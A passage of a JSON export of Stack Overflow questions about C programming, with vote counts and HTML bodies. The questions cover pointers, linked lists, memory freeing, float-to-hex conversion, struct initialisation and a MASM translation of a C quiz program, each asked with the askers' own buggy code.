rel=\"nofollow\">K &amp; R</a> but the C++ library is vastly more complex. There have got to be other big differences though.</p>\n\n<p>What are the major differences between C and C++?</p>\n"},{"tags":["c"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":2870,"score":0,"question_id":4990362,"title":"What is the difference between a macro and a function in C?","body":"<p>What is the difference between a macro and a function in C? Please tell me one application where I can use macros and functions?</p>\n"},{"tags":["c","arrays","pointers","notation","pure"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13243391,"title":"Can someone give me an example of \"pure pointer notation\" to an array in C?","body":"<p>I'm looking for an example of 'pure pointer notation' in C. I have an assignment to convert a program to pure pointer notation and it uses a lot of arrays. Also, can you give an example of what would not constitute as pure pointer notation? </p>\n\n<p>Thank you in advance for the help.</p>\n"},{"tags":["c","serialization"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":13242698,"title":"serialize data into a consecutive array","body":"<p>I have objects that I like to be able to serialize as a consecutive stream of bytes. Two questions:</p>\n\n<p>1) Is an array of <code>char</code> appropriate for this task? If not what are better options?</p>\n\n<p>2) What is the most efficient of doing this? So far what I have done is using <code>memcpy</code>. Is it possible to cast/convert a <code>double</code>, for instance, into 8 bytes of <code>chars</code> and vice versa without going through <code>memcpy</code>?</p>\n\n<p>I'm well aware of external libraries for this but I like to learn new stuff.</p>\n"},{"tags":["c","string","floating-point"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13243002,"title":"showing ? mark in terminal while processing the float to string in c","body":"<p>I'm working with embedded c in avrstudio4 .When Im trying to display the string by reading value which was written in Memory I'm getting error like \" ? \" instead of string that was  converted from float value.\"</p>\n\n<p>My prgrm lines:</p>\n\n<pre><code>-----writing to memory \n\n---variables declared = unsigned char WriteDataToBuffer[13];\nfloat cur=0.0;\nunsigned char ReadDataFromPage[20];\nchar adcResult5[30];\ncurrent = Get_Current_reading();\n\ncur = current * 3.3/1024;\nWriteDataToBuffer[2] =cur;\nDF_Write_to_Buffer(Buffer1,2,WriteDataToBuffer,1);              \n\nDF_Write_Buffer_to_Page(Buffer1,2); \n\n-------Reading frm Memory\ncomparing the entered string and then\n\nsprintf(adcResult5 ,\"%f\",ReadDataFromPage[2]);\n\nfputs(adcResult5, &amp;USBSerialStream);\nfputc(',', &amp;USBSerialStream);\n\noutput on terminal window \n\"?\"\n</code></pre>\n\n<p>Can anyone please hwlp me with this.Thnks</p>\n"},{"tags":["c","include","opencl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13242460,"title":"OpenCL including cl.h in code::blocks on Windows","body":"<p>Configuration question here, will hopefully help others in the future. </p>\n\n<p>I created a folder, \"C:\\openCLcode\\include\\\" which has all the necessary files from the Khronos site: <a href=\"http://www.khronos.org/registry/cl/\" rel=\"nofollow\">http://www.khronos.org/registry/cl/</a></p>\n\n<p>Now I want to create a Code::Blocks project that runs openCL. So I paste in some sample code and change the include paths: </p>\n\n<p>In my .c file:</p>\n\n<pre><code>#include &lt;C:\\openCLcode\\include\\cl.h&gt;\n</code></pre>\n\n<p>And within that <code>cl.h</code> file it complained about <code>cl_platform.h</code> so I fixed that path too:</p>\n\n<pre><code>#include &lt;C:\\openCLcode\\include\\cl_platform.h&gt;\n</code></pre>\n\n<p>Now the problem I get is: <code>undefined reference to 'clGetPlatformIDs@12'</code> Here is the offending function and line:</p>\n\n<pre><code>cl_device_id create_device() {\n\n   cl_platform_id platform;\n   cl_device_id dev;\n   int err;\n\n   /* Identify a platform */\n    //////////////THIS IS THE LINE WITH ERROR:////////////\n   err = clGetPlatformIDs(1, &amp;platform, NULL);\n    //////////////////////////////////////////////////////\n   if(err &lt; 0) {\n      perror(\"Couldn't identify a platform\");\n      exit(1);\n   }\n\n   /* Access a device */\n   err = clGetDeviceIDs(platform, CL_DEVICE_TYPE_GPU, 1, &amp;dev, NULL);\n   if(err == CL_DEVICE_NOT_FOUND) {\n      err = clGetDeviceIDs(platform, CL_DEVICE_TYPE_CPU, 1, &amp;dev, NULL);\n   }\n   if(err &lt; 0) {\n      perror(\"Couldn't access any devices\");\n      exit(1);\n   }\n\n   return dev;\n}\n</code></pre>\n\n<p>I feel like I really screwed up my include scheme.... Could someone recommend a better way to go about this? </p>\n\n<p>Much appreciated</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":66,"score":-1,"question_id":13242620,"title":"Read a file line by line for integers","body":"<p>I just want to output 3 integers from the file. Why this doesn't work? I get -1079184140 and similar.</p>\n\n<pre><code>int main(int argc, char *argv[]) \n{\n\n   FILE* stream  = fopen(argv[2], \"r\");\n\n   char line[80];\n\n  for (int i = 0; i &lt; 3; i++)\n  {\n    fgets(line, 80, stream);\n    printf(\"%d \\n\", line);\n  } \n\n  fclose(streamForInput);\n\n}\n</code></pre>\n"},{"tags":["c++","c","kinect","video-processing","openni"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":13242885,"title":"Convert Movie to OpenNI *.oni video","body":"<p>The <a href=\"http://openni.org/\" rel=\"nofollow\">Kinect OpenNI library</a> uses a custom video file format to store videos that contain rgb+d information. These videos have the extension *.oni. I am unable to find any information or documentation whatsoever on the ONI video format.</p>\n\n<p>I'm looking for a way to convert a conventional rgb video to a *.oni video. The depth channel can be left blank (ie zeroed out). For example purposes, I have a MPEG-4 encoded .mov file with audio and video channels.</p>\n\n<p>There are no restrictions on how this conversion must be made, I just need to convert it somehow! Ie, imagemagick, ffmpeg, mencoder are all ok, as is custom conversion code in C/C++ etc.</p>\n\n<p>So far, all I can find is <a href=\"https://github.com/OpenNI/OpenNI/blob/master/Samples/NiConvertXToONI/NiConvertXToONI.cpp\" rel=\"nofollow\">one C++ conversion utility in the OpenNI sources</a>. From the looks of it, I this converts from one *.oni file to another though. I've also managed to find <a href=\"http://www.uco.es/dptos/aceyte/arquitectura/profesores/jcgamez/?RESEARCH_%28English%29\" rel=\"nofollow\">a C++ script by a phd student that converts images from a academic database into a *.oni file</a>. Unfortunately the code is in spanish, not one of my native languages.</p>\n\n<p>Any help or pointers much appreciated!</p>\n"},{"tags":["c","list","pointers","stack","linked"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13241875,"title":"C linked list push function, just checking if this is correct","body":"<p>So I'm just wondering if this push function, which pushes a new value to the top a linked list stack is correct</p>\n\n<pre><code>void push(node** hd, int v){\nnode temp;\ntemp = (node*)malloc(sizeof(node));\ntemp -&gt; val = v;\ntemp -&gt; next = *hd;\n*hd = temp;\n</code></pre>\n\n<p>}</p>\n\n<p>Thanks in advance!</p>\n\n<p>Also I'm wondering how I would make a pop function, to pop the most recently pushed value off of the stack. </p>\n\n<p>The struct code looks like this by the way...</p>\n\n<pre><code>typedef struct nodeStruct\n{\nint val;\nstruct nodeStruct* next;\n}node;\n\ntypedef node* list;\n</code></pre>\n"},{"tags":["c","floating-point","ieee-754"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":4111,"score":3,"question_id":2941095,"title":"Convert ieee 754 float to hex with c - printf","body":"<p>Ideally the following code would take a float in IEEE 754 representation and convert it into hexadecimal  </p>\n\n<pre><code>void convert() //gets the float input from user and turns it into hexadecimal\n{\n    float f;\n    printf(\"Enter float: \");\n    scanf(\"%f\", &amp;f);\n    printf(\"hex is %x\", f);\n}\n</code></pre>\n\n<p>I'm not too sure what's going wrong. It's converting the number into a hexadecimal number, but a very wrong one. </p>\n\n<pre><code>123.1443 gives 40000000\n43.3     gives 60000000\n8        gives 0\n</code></pre>\n\n<p>so it's doing something, I'm just not too sure what.</p>\n\n<p>Help would be appreciated</p>\n"},{"tags":["c++","c"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":13242203,"title":"Conversion of C Style Casting to C++ Style Casting","body":"<p>I'm not familiar in C++ casting and I want to convert my C style casting to a C++ casting. Here is my code,</p>\n\n<pre><code>typedef unsigned char u8;\nu8 sTmp[20] = {0};\n\n//.. code to put string data in sTmp\n\nchar* sData;\nsData = (char*)&amp;(sTmp[0]);\n</code></pre>\n\n<p>Here, I want to convert <code>(char*)&amp;(sTmp[0])</code> to a C++ casting.</p>\n\n<p>Many thanks.</p>\n"},{"tags":["c","function"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13242266,"title":"2 questions about function pointer in c","body":"<p>I have two questions</p>\n\n<p>1.I saw that </p>\n\n<pre><code>int (*Ptr)(int,int);\nPtr=someOtherFuncion;\n</code></pre>\n\n<p>Its not should be like that?</p>\n\n<pre><code>Ptr=&amp;someOtherFuncion;\n</code></pre>\n\n<p>2.I learn that function pointer its for callback\nlike that</p>\n\n<pre><code>    someOtherFunction(functionPointer)\n</code></pre>\n\n<p>what is the differeence if I will put a regular function that is not pointer?</p>\n"},{"tags":["c","c++"],"answer_count":9,"favorite_count":3,"up_vote_count":4,"down_vote_count":1,"view_count":3845,"score":3,"question_id":1021112,"title":"Best C/C++ Libraries for maintaining session state in CGI application?","body":"<p>I have heard of Boost and ACE as two of the well known C++ libraries. What are the other good C/C++ libraries available? </p>\n\n<p>Does Boost and ACE support session management for web applications written in C/C++?</p>\n\n<p>EDIT: Ok I will try to be domain specific. I am looking for a C/C++ library which could help me maintain session state for a C++ based CGI web application.</p>\n"},{"tags":["c","shared-memory","sparse-matrix"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":30,"score":-2,"question_id":13239607,"title":"Parallel array or array of structures","body":"<p>I am trying to implement a sparse matrix (COO format) framework in C for parallel computing (shared memory). Initially I was planning to have an array of struct of the spatial information.</p>\n\n<pre><code>    typedef struct {\n    unsigned int rowIdx;  \\\\ Row Index\n    unsigned int colIdx;  \\\\ Col Index\n    unsigned int dataVal; \\\\ Value\n    } entity, *spMat;\n</code></pre>\n\n<p>How does parallel array perform for the same ?</p>\n"},{"tags":["c","variadic"],"answer_count":8,"favorite_count":2,"up_vote_count":29,"down_vote_count":0,"view_count":7135,"score":29,"question_id":150543,"title":"Forward an invocation of a variadic function in C","body":"<p>In C, is it possible to forward the invocation of a variadic function? As in,</p>\n\n<pre>int my_printf(char *fmt, ...) {\n  fprintf(stderr, \"Calling printf with fmt %s\", fmt);\n  return SOMEHOW_INVOKE_LIBC_PRINTF;\n}\n</pre>\n\n<p>Forwarding the invocation in the manner above obviously isn't strictly necessary in this case (since you could log invocations in other ways, or use vfprintf), but the codebase I'm working on requires the wrapper to do some actual work, and doesn't have (and can't have added) a helper function akin to vfprintf.</p>\n\n<p>[Update: there seems to be some confusion based on the answers that have been supplied so far. To phrase the question another way: in general, can you wrap some arbitrary variadic function <i>without modifying that function's definition</i>.]</p>\n"},{"tags":["c","arrays","data-structures","types"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":310,"score":1,"question_id":8376004,"title":"What is the difference between an Array Data Structure and an Array Data-type in the context of a programming language like C?","body":"<p>Wikipedia differentiates an <a href=\"http://en.wikipedia.org/wiki/Array_data_structure\" rel=\"nofollow\">Array Data Structure</a> and an <a href=\"http://en.wikipedia.org/wiki/Array_data_type\" rel=\"nofollow\">Array Data-type</a>.</p>\n\n<p>What is the difference between an Array Data Structure and an Array Data-type in the context of a programming language like C?</p>\n\n<p>What is this : <code>int array[]={1, 2, 3, 4, 5};</code> ?</p>\n\n<p>Is it an Array Data Structure or an Array Data-type? Why?</p>\n"},{"tags":["c++","c"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":93,"score":-1,"question_id":13241167,"title":"How do I store a variable length string in C/C++","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/116038/what-is-the-best-way-to-slurp-a-file-into-a-stdstring-in-c\">What is the best way to slurp a file into a std::string in c++?</a>  </p>\n</blockquote>\n\n\n\n<p>Im trying to store a whole text file as a string, \nhow can I dynamically store any amount of characters the text file may contain?</p>\n"},{"tags":["c","pipes"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":123,"score":1,"question_id":10265249,"title":"How do I read multiple lines of input through a pipe?","body":"<p>Alright, so I am having a problem with transferring input from a simple shell through pipes from a parent process to a child process that has been execlp'd into a logging program. The program in the child process is supposed to print the input that it receives into a file, but I cannot figure out how to pass it an input string, let it process that input string, and then have it wait for another one. I figure that I need to have a read function call somewhere in the child, but I can't figure out how to implement it.</p>\n\n<p>Thoughts?</p>\n\n<p><a href=\"http://pastebin.com/pmU7viNd\" rel=\"nofollow\">http://pastebin.com/pmU7viNd</a>\n(The logger-related part of the simple shell code)</p>\n\n<p><a href=\"http://pastebin.com/AnkxDdUK\" rel=\"nofollow\">http://pastebin.com/AnkxDdUK</a>\n(The code of the logger itself)</p>\n"},{"tags":["c","assembly","x86","masm"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":727,"score":4,"question_id":4104287,"title":"C code to Assembly question","body":"<p>I need to translate this C code to assembly language code</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void)\n{\n    int answer, i;\n    int right, wrong;\n    right = 0;\n    wrong = 0;\n\n    for(i =1; i &lt; 11; i = i+1){\n        printf(\"What is %d + %d? \", i,i);\n        scanf( \"%d\", &amp;answer);\n\n        if(answer == i + 1) {\n            printf(\"right!  \");\n            right++;\n        }\n        else {\n            printf(\"Sorry, you're wrong.    \");\n            printf(\"The answer is %d.   \", i + 1);\n            wrong++;\n        }\n    }\n    printf(\"You got %d right and %d wrong. \", right, wrong );\n    return 0;\n}\n</code></pre>\n\n<p>I really just need to know how to combine a variable with a string in assembly language like in the above C code. I think I can handle everything else. Could somebody tell me. Would I have to use some kind of reference[].</p>\n\n<p><em>Note I'm using MASM and working out of Kip Irvine's Assembly Language for x86 processors 6th edition book</em></p>\n\n<p><em>update heres the code I attempted to write over to MASM from one of the answerer's answer</em> I keep getting a error. Like I said before I'm using Kip Irvine's Assembly Language so I have to include the library link INCLUDE Irvine32.inc</p>\n\n<blockquote>\n  <blockquote>\n    <blockquote>\n      <p>this is the error>>>> programb.obj : error LNK2019: unresolved external symbol _scanf referenced in function _main@0</p>\n    </blockquote>\n  </blockquote>\n</blockquote>\n\n<p>INCLUDE Irvine32.inc</p>\n\n<p>can somebody help me get this right</p>\n\n<pre><code>.data\nstring1 db \"What is %d + %d?  \", 0\nstring2 db \"%d\", 0\nstring3 db \"right!  \", 0\nstring4 db \"Sorry, you're wrong.   The answer is %d\", 10, 0\nstring5 db \"You got %d right and %d wrong.\", 10, 0\n\n\nanswer dd 0\nright  dd 0\nwrong  dd 0\n\n.code\nmain PROC\n\n   mov ebx, 1\n\nL1:\n\n   cmp ebx, 11\n   je L2\n\n   push 1\n   push ebx\n   mov edx,OFFSET string1\n   call WriteString\n   add esp, 12\n\n   push answer\n   mov edx,OFFSET string2\n   call scanf\n   add esp, 8\n\n   inc ebx\n   cmp answer, ebx\n   jne L3\n\n   push ebx\n   mov edx,OFFSET string3\n   call WriteString\n   add esp, 8\n   inc right\n\n   jmp L1\n\nL3:\n\n   push ebx\n   mov edx,OFFSET string4\n   call WriteString\n   add esp, 8\n   inc  wrong\n\n   jmp L1\n\nL2:\n\n   push  wrong\n   push  right\n   mov EDX,OFFSET string5\n   call WriteString\n   add esp, 12\n\n\n   exit\n\nmain ENDP\nEND main\n\nprogramb.obj : error LNK2019: unresolved external symbol _scanf referenced in function _main@0\n</code></pre>\n\n<p>I'm sorry about the assembly language code....I don't know how to format it so it can be easier to read....</p>\n"},{"tags":["c++","c","coding-style","good-design"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":126,"score":0,"question_id":13241282,"title":"Is there anywhere I can get a list of good C++ programming practice?","body":"<p>I want to make sure my code looks professional for when the time comes to get a job and start college, but I can't find much on good programming practice in C++.</p>\n\n<p>Anyone have a good place to look? I would really like a site that has a list of all the things I should really start doing.</p>\n\n<p>Thanks,</p>\n\n<p>Johnny P.</p>\n"},{"tags":["c","arm","signal-processing"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":40,"score":4,"question_id":13241276,"title":"Complex Dot Product in CMSIS DSP LIBRARY","body":"<p>Recently I've been checking out the CMSIS DSP complex math functions library and I've seen something I cannot fully comprehend, thus my first post on SO. </p>\n\n<p>What I'm unable to grasp is how the he11 can the complex dot product function yeild a proper result? The function may be found here: <a href=\"http://pastebin.com/1Tx0Sz4Z\" rel=\"nofollow\">Complex Dot Product</a></p>\n\n<p>As far as I'm concerned the part </p>\n\n<pre><code>for(n=0; n&lt;numSamples; n++) {  \n   realResult += pSrcA[(2*n)+0]*pSrcB[(2*n)+0] - pSrcA[(2*n)+1]*pSrcB[(2*n)+1];  \n   imagResult += pSrcA[(2*n)+0]*pSrcB[(2*n)+1] + pSrcA[(2*n)+1]*pSrcB[(2*n)+0];  \n}  \n</code></pre>\n\n<p>is A-okay, but how's that:</p>\n\n<pre><code>/* CReal = A[0]* B[0] + A[2]* B[2] + A[4]* B[4] + .....+ A[numSamples-2]* B[numSamples-2] */\nreal_sum += (*pSrcA++) * (*pSrcB++);\n/* CImag = A[1]* B[1] + A[3]* B[3] + A[5]* B[5] + .....+ A[numSamples-1]* B[numSamples-1] */\nimag_sum += (*pSrcA++) * (*pSrcB++);\n</code></pre>\n\n<p>supposed to work, since it misses the product of real*imag parts of the samples?</p>\n\n<p>It might - and most probably is - a really dumb question, but somehow I simply cannot see it working.</p>\n"},{"tags":["c","free","access-violation"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":13225501,"title":"Access violation when using free() when running but not when debugging... slowly","body":"<p>As per my previous <a href=\"http://stackoverflow.com/questions/13224113/using-a-pointer-to-a-dynamic-2d-array-within-a-struct\">question</a> (many thanks to Jonathan Leffler), I edited my code (second two blocks of code), but I ran into a rather strange problem.</p>\n\n<p>The following one breaks unpredictably...</p>\n\n<pre><code>void free_array(array_info *A)\n{\n    int i;\n    for(i = 0; i &lt; (A-&gt;height); ++i)\n    {\n        printf(\"About to free: %x\\n\", A-&gt;dat_ptr[i]);//for debugging purposes\n        free(A-&gt;dat_ptr[i]);\n        printf(\"Freed row %i\\n\", i);//for debugging purposes\n    }\n    free(A-&gt;dat_ptr);\n}\n</code></pre>\n\n<p>I initially tested <code>create_array</code> directly followd by <code>free_array</code> and it worked flawlessly with rather big arrays (10^8). However, when I do my calculations in between and then try to <code>free()</code> the arrays, I get an access violation exception (c00000005). When I was debugging it, I noticed that the program would execute perfectly every time if I had a breakpoint within the \"free_array\" loop and did every line individually. However, the compiled code wouldn't ever run past row6 of my second array on its own. I turned off all optimisations in the compiler, and I still got the error upon execution.</p>\n\n<h1>Additional info</h1>\n\n<pre><code>typedef struct {\n    int    height;\n    int    width;\n    int    bottom;//position of the bottom tube/slice boundary\n    unsigned int**  dat_ptr;//a pointer to a 2d array\n    } array_info;\n</code></pre>\n\n<p>Where the <code>dat_ptr</code> is now a proper 2D pointer. The <code>create_array</code> function that creates the array that is to be put in the structure is (i have stripped NULL checks for readability):</p>\n\n<pre><code>int create_array(array_info *A)\n{\nint i;\nunsigned int **array = malloc(sizeof(*array) * A-&gt;height);\n\nfor (i = 0; i &lt; A-&gt;height; ++i)\n{\n    array[i] = malloc(sizeof(**array) * A-&gt;width);\n}\n\nA-&gt;dat_ptr = array;\nreturn 0;\n}\n</code></pre>\n\n<p>This function works exactly as expected.</p>\n\n<h1>More Additional Info</h1>\n\n<h2>Added after the responses of Jonathan, Chris, and rharrison33</h2>\n\n<p>Thank you so much, Jonathan, with every one of your posts I find out so much about programming :) I finally found the culprit. The code causing the exception was the following:</p>\n\n<pre><code>void fill_number(array_info* array,  int value,  int x1,  int y1,  int x2,  int y2)//fills a rectangular part of the array with `value`\n    {\n    int i, j;\n    for(i=y1 ; ((i&lt;=y2)&amp;&amp;(i&lt;array-&gt;height)) ; i++)//start seeding the values by row (as in vertically)\n    {\n        for(j=x1 ; ((i&lt;=x2)&amp;&amp;(i&lt;array-&gt;width)) ; j++)//seed the values by columns (as in horizontally)\n        {\n        array-&gt;dat_ptr[i][j]=value;\n        }\n    }\n}\n</code></pre>\n\n<p>And <code>((i&lt;=x2)&amp;&amp;(i&lt;=array-&gt;width))</code> wasn't being evaluated as I expected (Chris Dodd, you were right). I thought that it would evaluate both conditions in that order or stop if either was \"FALSE\", independent of their order. However, it turned out it didn't work that way and it was simply refusing to evaluate the <code>(i&lt;array-&gt;width)</code> part correctly. Also, I assumed that it would trigger an exception upon trying to access memory outside of the array range, but it didn't. Anyway,</p>\n\n<p>I changed the code to:</p>\n\n<pre><code>void fill_number(array_info* array,  int value,  int x1,  int y1,\n                                                    int x2,  int y2)\n{\n    int i, j;\n    if(y1&gt;=array-&gt;height){ y1=array-&gt;height-1;}\n    if(y2&gt;=array-&gt;height){ y1=array-&gt;height-1;}\n    if(x1&gt;=array-&gt;width) { x2=array-&gt;width-1;}\n    if(x2&gt;=array-&gt;width) { x2=array-&gt;width-1;}\n    for(i=y1 ; i&lt;=y2 ; i++)//start seeding the values by row\n    {\n        for(j=x1 ; j&lt;=x2 ; j++)//seed the values by column\n        {\n        array-&gt;dat_ptr[i][j]=value;\n        }\n    }\n}\n</code></pre>\n\n<p>And now it works. The block of <code>if()</code>s is there because I won't be calling the function very often compared to the rest of the code and I need a visual way to remind me that the check is there.</p>\n\n<p>Again, thank you so much Jonathan Leffler, Chris Dodd, and rharrison33 :)</p>\n"},{"tags":["c","hex"],"answer_count":14,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":57509,"score":6,"question_id":10324,"title":"How can I convert a hexadecimal number to base 10 efficiently in C?","body":"<p>In C what is the most efficient way to convert a hexadecimal value to its base 10 value?</p>\n\n<p>For example, if I have FFFFFFFE the result would be 4294967294.</p>\n"},{"tags":["c","struct"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":13238913,"title":"Setting a struct equal to a value","body":"<p>Let's say I have a <code>struct</code> with a field <code>x</code> that is also a <code>struct</code> (not a pointer to a <code>struct</code>).</p>\n\n<p>If I say <code>object.x = 0</code>, what is actually happening under the hood?</p>\n"},{"tags":["c","kdevelop"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3905,"score":0,"question_id":5036809,"title":"Kdevelop-How to create a C project?","body":"<p>im using Kdevelop to create C++ projects... But Im needing create C projects, now...\nIn 3.xx versions, i had got the option to create that projects, but now Im using Kdevelop 4.2, and i only can see C++ templates( QT / NOGui )...\nSomeone knows how i should configure Kdevelop for C projects?</p>\n"},{"tags":["c","switch-statement"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":107,"score":3,"question_id":13226124,"title":"C: switch case with logical operator","body":"<p>While I am new to c and want help in this program </p>\n\n<p>my code is :</p>\n\n<pre><code> #include&lt;stdio.h&gt;  \n #include&lt;conio.h&gt;  \n void main()\n {\n\n  int suite=2;  \n\n  switch(suite)\n     {           \n      case 1||2:\n      printf(\"hi\");\n\n      case 3:\n      printf(\"byee\");\n\n      default:\n      printf(\"hello\");\n     }\n\n  printf(\"I thought somebody\");\n  getche();\n  }\n</code></pre>\n\n<p>I am working in turbo c and it shows no error and the output is<br>\nhelloI thought somebody</p>\n\n<p>Please, let me know how is this working ???\n<strong>note :- here break is not the case as I intentionally left them.</strong></p>\n"},{"tags":["c","debugging","linked-list"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":13238929,"title":"Various errors in C implementation of linked list","body":"<p>Here's my code. I'm fairly sure I've implemented the Linked List correctly, but I assume there are some syntax errors.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct node {\n    int data;\n    struct *node next;\n};\n\nvoid push(struct node** headRef, int data)\n{\n    struct node* newNode;\n    newNode = malloc(sizeof(struct node));\n    newNode-&gt;data = data;\n    newNode-&gt;next = *headRef;\n\n    *headRef = newNode;\n}\n\nstruct node* primeFactors(int num)\n{\n    struct node* head = NULL;\n    if (num == 1)\n    {\n        return head;\n    }\n    int factor = 0;\n    int i = 2;\n    while (i &lt;= num)\n    {\n        if (num % i)\n        {\n            factor = i;\n        }\n    }\n    push(&amp;head, factor);\n    primeFactors(num / factor);\n    return head;\n}\n\nint main(int argc, char const *argv[])\n{\n    struct node* head = primeFactor(600851475143);\n    printf(\"%d/n\", head-&gt;data);\n}\n</code></pre>\n\n<p>Here are my errors. I have no idea what most of these mean, and struct node definitely should have a member named next.</p>\n\n<pre>\n    [1] $ gcc 3.c -o 3                                                                                                                 \n    3.c:6:9: error: expected ‘{’ before ‘*’ token\n    3.c: In function ‘push’:\n    3.c:14:9: error: ‘struct node’ has no member named ‘next’\n    3.c: In function ‘main’:\n    3.c:42:22: warning: initialisation makes pointer from integer without a cast [enabled by default]\n</pre>\n\n<p>Help would really be appreciated!</p>\n"},{"tags":["c++","c","gcc","memory-management","ansi"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":85,"score":3,"question_id":13238635,"title":"Initialize struct members to 0 (gcc -Wextra)","body":"<p>I want to initialize all struct members to 0. Common solution is to make something like this:</p>\n\n<pre><code>struct foo bar = {0}\n</code></pre>\n\n<p>I create this example:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nstruct Stru2 {\n    int c;\n    int d;\n};\n\nstruct Stru1 {\n    int a;\n    Stru2 b;\n};\n\nint main()\n{\n    struct Stru1 aaa = { 0 };\n    return aaa.b.c;\n}\n</code></pre>\n\n<p>And I compile (gcc 4.6.3) it whit this parameters, to make sure how ANSI handle this</p>\n\n<pre><code>gcc -Wall -Wextra -pedantic -ansi main.cpp\n</code></pre>\n\n<p>And I got following warnings:</p>\n\n<pre><code>main.cpp: In function ‘int main()’: \nmain.cpp:36:28: warning: missing initializer for member ‘Stru1::b’ [-Wmissing-field-initializers]\n</code></pre>\n\n<p>The question is, why <strong>-Wextra</strong>, generate this warning? Maybe not always \"= {0}\", set all members to 0?</p>\n"},{"tags":["c","linked-list","stack"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":13240504,"title":"Linked List Stack in C","body":"<p>I am looking at the following paragraph in the book \"Programming Interviews Exposed\" in reference to the implementation of a linked list stack in C:</p>\n\n<pre><code>typedef struct Element {\n   struct Element *next;\n   void *data; \n} Element;\n\nvoid push( Element *stack, void *data ); \nvoid *pop( Element *stack );\n</code></pre>\n\n<blockquote>\n  <p>Now consider what will happen in these routines in terms of proper\n  functionality and error handling. Both operations change the first\n  element of the list. The calling routine’s stack pointer must be\n  modified to reflect this change, but any change you make to the\n  pointer that is passed to these functions won’t be propagated back to\n  the calling routine. You can solve this problem by having both\n  routines take a pointer to a pointer to the stack. This way, you can\n  change the calling routine’s pointer so that it continues to point at\n  the first element of the list. Implementing this change results in the\n  following:</p>\n</blockquote>\n\n<pre><code>void push( Element **stack, void *data ); \nvoid *pop( Element **stack);\n</code></pre>\n\n<p>Could someone explain, in different words, why we need to use a double pointer here? I'm a bit unsure about the explanation provided.</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13240462,"title":"Using structs in multiple files","body":"<p>I am trying to call a function in main.c from io.h that reads data from a file, stores that data into multiple structs, then somehow lets me pass the different structs as arguments in later functions in main. Those later functions will be defined in other files, such as alg.h.</p>\n\n<p>How do I go about doing this? Do I use extern and make the structs global and put them in a separate file? Is it possible to have a function from alg.h have a return type of one of the structs? Does it depend on the order of my includes?</p>\n\n<p>The code pasted below complies and works, but any attempt to move either of the structs causes the program to not compile. </p>\n\n<p>Also, is it possible to have, for example, a struct declared in alg.h, then functions that have that struct as a parameter declared later in alg.h. Then in main.c, you initialize and pass the struct into a function declared in io.h, give the struct some values, have it returned to main.c, then pass that into the function declared in alg.h? I know that sounds like a class, but I need a C solution and I only need one instance of the struct floating around.</p>\n\n<p>Thanks.</p>\n\n<p>io.h</p>\n\n<pre><code>struct s1 {\n    int num1;\n    double num2;\n};\n\nstruct s2 {\n    int num3;\n    double num4;\n};\n\nvoid io_init(struct s1*, struct s2*);\n</code></pre>\n\n<p>io.c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#include \"io.h\"\n\nvoid io_init(struct s1* s1i, struct s2* s2i)\n{\n    s1i-&gt;num1 = 5;\n    s1i-&gt;num2 = 2.4;\n\n    FILE *fp;\n    char line[80];\n\n    fp = fopen(\"input.txt\",\"rt\");\n\n    fgets(line, 80, fp);\n    sscanf(line,\"%i\",&amp;s2i-&gt;num3);\n    fgets(line, 80, fp);\n    sscanf(line,\"%i\",&amp;s2i-&gt;num4);\n\n    fclose(fp);\n}\n</code></pre>\n\n<p>alg.h</p>\n\n<pre><code>void ga_init(struct s1);\n</code></pre>\n\n<p>alg.c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#include \"io.h\"\n#include \"ga.h\"\n\nvoid ga_init(struct s1 s1i)\n{\n    printf(\"%i\", s1i.val1);\n}\n</code></pre>\n\n<p>main.c:</p>\n\n<pre><code>#include 